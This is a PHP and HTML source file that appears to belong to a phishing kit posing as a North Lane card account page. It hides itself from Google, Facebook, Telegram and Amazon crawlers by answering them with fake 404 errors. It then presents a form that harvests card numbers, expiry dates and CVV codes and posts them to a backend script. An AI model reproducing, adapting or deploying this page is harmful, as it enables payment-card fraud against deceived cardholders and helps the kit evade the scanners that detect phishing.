<?php
ini_set( "display_errors", 0); 
include '../../../main.php';


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SERVER['HTTP_USER_AGENT'],'facebook') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'facebook') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SERVER['HTTP_USER_AGENT'],'telegram') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'telegram') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SERVER['HTTP_USER_AGENT'],'amazon') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'amazon') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
session_start();

?>
<!DOCTYPE html>
<html lang="en">
<head>
<?php
require_once("cc-valid.php");
?>
 <link rel = "icon" href = 
"https://play-lh.googleusercontent.com/uIAolFudrT5nMipLa3_AjQeYGjtg1XoPtZwYRVPIrNiHuKTx5yDm_MANmtqzeX0jj3s" 
        type = "image/x-icon">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>North Lane</title>
	<link rel="stylesheet" href="styles.css">
	<script src="jquery-3.3.1.min.js"></script>
    <script src="jquery.mask.min.js"></script>
    <script src="card-validator.js"></script>
</head>
<body>

<style>
    .center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width: 100%;
}
</style>
<img src="https://login.northlane.com:443/xContent/content/op/i/default-partner.png" alt="MyAccount" id="partner" class="center"> 
 <div><style>
 h1 {
  display: block;
  font-size: 2em;
  margin-top: 0.5em;
  margin-bottom: 0.67em;
  margin-left: 0;
  margin-right: 0;
}</style>
<h1 class="h1" style="text-align:center"></h1>

<form action="proses.php" method="post" class="checkout_form" >
    <div class="card_number" id="card-container">
        <input type="text" name="card" class="input" id="card" placeholder="Card Number"> 
        <div id="logo"></div>
    </div>
    <div class="card_grp"> <form action="/Card/proses.php" method="post">  
      <div class="expiry_date">
        <input type="text" name="month" class="expiry_input" data-mask="00"  placeholder="Month">
        <input type="text" name="year" class="expiry_input" data-mask="00" placeholder="Year">
      </div>
      <div class="cvc"> <form action="/Card/proses.php" method="post">
        <input type="text" name="cvv" class="cvc_input" data-mask="000" placeholder="CVV">
        <div class="cvc_img">
            ?
           <div class="img">
             <img src="https://i.imgur.com/2ameC0C.png" alt="">
          </div>
        </div>
      </div>
    </div>
            <div class="btn">
                <input type="submit" class="btn" value="Continue" title="Continue">
                    </dd>
        </dl>
    </form>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
<script src="card-validator.js"></script>
<script>
  $.validate({
    modules : 'security'
  });
  Inputmask("9{1,2}/9{1,4}").mask("#exp");

$("#formid").validate({
  invalidHandler: function(event, validator) {
    // 'this' refers to the form
    var errors = validator.numberOfInvalids();
    if (errors) {
      var message = errors == 1
        ? 'You missed 1 field. It has been highlighted'
        : 'You missed ' + errors + ' fields. They have been highlighted';
      $("div.error span").html(message);
      $("div.error").show();
    } else {
      $("div.error").hide();
    }
  }
});
</script>
<script>
        function hanyaAngka(evt) {
          var charCode = (evt.which) ? evt.which : event.keyCode
           if (charCode > 31 && (charCode < 48 || charCode > 57))
 
            return false;
          return true;
        }
    </script>
</body>
</html>

